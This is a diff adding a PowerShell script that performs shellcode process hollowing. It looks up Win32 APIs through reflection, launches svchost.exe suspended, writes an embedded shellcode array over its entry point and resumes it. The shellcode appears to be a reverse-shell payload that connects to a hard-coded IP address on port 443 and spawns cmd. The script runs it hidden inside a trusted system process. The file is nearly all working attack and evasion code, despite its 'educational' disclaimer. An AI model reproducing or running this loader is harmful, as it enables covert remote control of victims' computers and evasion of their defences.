@@ -1,0 +1,133 @@
+<#
+
+DynWin32-ShellcodeProcessHollowing.ps1 performs shellcode based process hollowing using
+dynamically looked up Win32 API calls. The script obtains the methods GetModuleHandle,
+GetProcAddress and CreateProcess by using reflection. Afterwards it utilizes GetModuleHandle
+and GetProcAddress to obtain the addresses of the other required Win32 API calls.
+
+When all required Win32 API calls are looked up, it starts svchost.exe in a suspended state
+and overwrites the entrypoint with the specified shellcode. Afterwards, the thread is resumed
+and the shellcode is executed enveloped within the trusted svchost.exe process.
+
+This script should be used for educational purposes only. It was only tested on Windows 10 (x64)
+and is probably not stable or portable. It's only purpose is to demonstrate the usage of reflective
+lookups of Win32 API calls. See it as just an silly experiment :)
+
+Author: Tobias Neitzel (@qtc_de)
+License: GPL-3.0 License
+
+#>
+
+[Byte[]] $SHELLCODE = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x1,0xbb,0xa,0xa,0x1e,0x43,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5
+
+
+
+filter Get-Type ([string]$dllName,[string]$typeName)
+{
+    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
+    {
+        $_.GetType($typeName)
+    }
+}
+
+function Get-Function
+{
+    Param(
+        [string] $module,
+        [string] $function
+    )
+
+    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
+    {
+        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
+    }
+
+    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
+    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
+}
+
+function Get-Delegate
+{
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
+        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
+        [Parameter(Position = 2)] [Type] $retType = [Void]
+    )
+
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('QM', $false).
+    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
+    $delegate = $type.CreateType()
+
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
+}
+
+# Obtain the required types via reflection
+$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
+$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
+$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
+$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'
+
+# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
+$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
+$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
+$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")
+
+# Obtain the function addresses of the required hollowing functions
+$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
+$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
+$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
+$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"
+
+# Create the delegate types to call the previously obtain function addresses
+$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
+$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
+$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
+$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])
+
+# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
+$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
+$processInformation = $processInformationType.GetConstructors().Invoke($null)
+
+$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
+$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
+
+# Obtain the required handles from the PROCESS_INFORMATION structure
+$hThread = $processInformation.hThread
+$hProcess = $processInformation.hProcess
+
+# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
+$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
+$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)
+
+# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
+# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
+# addr is located at offset 0x10.
+$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))
+
+# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
+# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
+# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
+$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
+$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)
+
+$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
+$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)
+
+# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
+# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
+# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
+# found the non relative entry point address.
+$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)
+
+$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
+$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
+$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint
+
+# Overwrite the entrypoint with shellcode and resume the thread.
+$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
+$ResumeThread.Invoke($hThread)
+
